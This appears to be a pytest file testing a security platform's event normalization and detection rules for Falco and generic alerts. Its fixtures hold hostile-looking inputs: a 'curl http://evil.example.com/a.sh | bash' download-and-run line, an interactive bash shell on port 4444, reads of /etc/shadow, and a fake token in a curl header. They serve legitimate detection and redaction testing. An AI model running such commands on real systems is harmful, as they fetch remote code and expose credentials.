"""Unit tests for event normalization and the detection rule DSL."""

from __future__ import annotations

import uuid
from datetime import UTC, datetime

import pytest

from app.core.errors import ValidationError
from app.modules.events import normalize, rules


def _doc(**overrides):
    document = {
        "source": "FALCO",
        "category": "RUNTIME",
        "event_type": "falco.terminal_shell_in_container",
        "severity": "HIGH",
        "title": "Shell in container",
        "normalized": {
            "process": "bash",
            "command_line": "bash -i",
            "file_path": "/etc/shadow",
            "remote_ip": "10.1.2.3",
            "remote_port": 4444,
            "container": {"image": "ghcr.io/acme/api:1.2.3"},
        },
    }
    document.update(overrides)
    return document


def test_all_any_and_not_groups_are_evaluated():
    condition = {
        "all": [
            {"field": "normalized.process", "op": "eq", "value": "bash"},
            {
                "any": [
                    {"field": "normalized.file_path", "op": "eq", "value": "/etc/passwd"},
                    {"field": "normalized.file_path", "op": "eq", "value": "/etc/shadow"},
                ]
            },
            {"not": {"field": "normalized.user", "op": "eq", "value": "root"}},
        ]
    }
    rules.validate_conditions(condition)
    assert rules.matches(condition, _doc()) is True
    root_document = _doc(
        normalized={"process": "bash", "file_path": "/etc/passwd", "user": "root"}
    )
    assert rules.matches(condition, root_document) is False


def test_cidr_matching_is_arithmetic_not_string_prefix():
    condition = {"all": [{"field": "normalized.remote_ip", "op": "in_cidr", "value": ["10.0.0.0/8"]}]}
    assert rules.matches(condition, _doc()) is True
    outside = _doc(normalized={"remote_ip": "11.0.0.1"})
    assert rules.matches(condition, outside) is False


def test_invalid_conditions_are_rejected_before_storage():
    with pytest.raises(ValidationError):
        rules.validate_conditions({"all": [{"field": "normalized.__class__", "op": "eq", "value": "x"}]})
    with pytest.raises(ValidationError):
        rules.validate_conditions({"all": [{"field": "normalized.process", "op": "exec", "value": "x"}]})
    with pytest.raises(ValidationError):
        rules.validate_conditions(
            {"all": [{"field": "normalized.remote_ip", "op": "in_cidr", "value": ["bad"]}]}
        )


def test_empty_conditions_never_match_an_inbound_event():
    rule = rules.DetectionRule(slug="x", name="x", conditions={})
    assert rules.rule_matches(rule, _doc()) is False


def test_falco_priority_maps_to_platform_severity():
    payload = {
        "priority": "Critical",
        "rule": "Terminal shell in container",
        "output": "A shell was spawned",
        "output_fields": {"proc.name": "bash", "container.image.repository": "ghcr.io/acme/api"},
    }
    event = normalize.normalize_falco(payload)
    assert event.severity == "CRITICAL"
    assert event.event_type == "falco.terminal_shell_in_container"
    assert event.normalized["container"]["image"] == "ghcr.io/acme/api"
    assert event.asset_hint == {
        "kind": "CONTAINER_IMAGE",
        "external_ref": "docker://ghcr.io/acme/api",
        "name": "ghcr.io/acme/api",
    }


def test_falco_payload_is_bounded_and_redacted():
    token = "ghp_" + "a" * 36
    payload = {
        "priority": "warning",
        "rule": "Read sensitive file",
        "output": f"token {token}",
        "output_fields": {"fd.name": "/etc/shadow", "proc.cmdline": f"curl -H 'Authorization: {token}'"},
        "extra": "x" * 50000,
    }
    event = normalize.normalize_falco(payload)
    assert token not in str(event.raw)
    assert token not in (event.description or "")
    assert len(str(event.raw)) < normalize.MAX_RAW_BYTES + 2000


def test_indicators_extracted_from_command_line():
    event = normalize.normalize_generic(
        {
            "event_type": "process.execution",
            "normalized": {
                "command_line": "curl http://evil.example.com/a.sh | bash # 8.8.8.8",
                "remote_ip": "203.0.113.9",
            },
        }
    )
    values = {(item["type"], item["value"]) for item in event.indicators}
    assert ("IP", "203.0.113.9") in values
    assert ("DOMAIN", "evil.example.com") in values
    assert ("IP", "8.8.8.8") in values


def test_generic_event_rejects_unknown_severity_and_missing_type():
    with pytest.raises(normalize.NormalizationError):
        normalize.normalize_generic({"event_type": "x", "severity": "SEVERE"})
    with pytest.raises(normalize.NormalizationError):
        normalize.normalize_generic({"normalized": {}})


def test_fingerprint_is_stable_and_discriminates_identity():
    event = normalize.normalize_generic(
        {"event_type": "process.execution", "normalized": {"process": "bash", "command_line": "bash -i"}}
    )
    asset_key = str(uuid.uuid4())
    first = normalize.fingerprint(event, asset_key=asset_key)
    second = normalize.fingerprint(event, asset_key=asset_key)
    assert first == second  # deterministic for identical input
    other = normalize.normalize_generic(
        {"event_type": "process.execution", "normalized": {"process": "sh"}}
    )
    assert normalize.fingerprint(other, asset_key="a") != normalize.fingerprint(event, asset_key="a")


def test_occurred_at_falls_back_to_now_when_unparseable():
    before = datetime.now(UTC)
    event = normalize.normalize_generic({"event_type": "x", "occurred_at": "not-a-time"})
    assert event.occurred_at >= before


def test_builtin_rules_are_valid_and_unique():
    slugs = [definition["slug"] for definition in rules.BUILTIN_RULES]
    assert len(slugs) == len(set(slugs))
    for definition in rules.BUILTIN_RULES:
        rules.validate_conditions(definition["conditions"])
